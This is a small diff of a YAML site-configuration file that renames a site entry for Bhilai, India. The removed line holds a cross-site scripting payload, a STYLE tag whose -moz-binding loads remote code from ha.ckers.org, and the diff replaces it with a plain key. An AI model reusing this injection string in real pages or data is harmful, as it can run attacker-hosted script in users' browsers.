@@ -1,6 +1,6 @@
 ---
 sites v4.5:
-  <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>_SITE:
+  BHILAI_SITE:
     address:
       city: Bhilai
       country: India
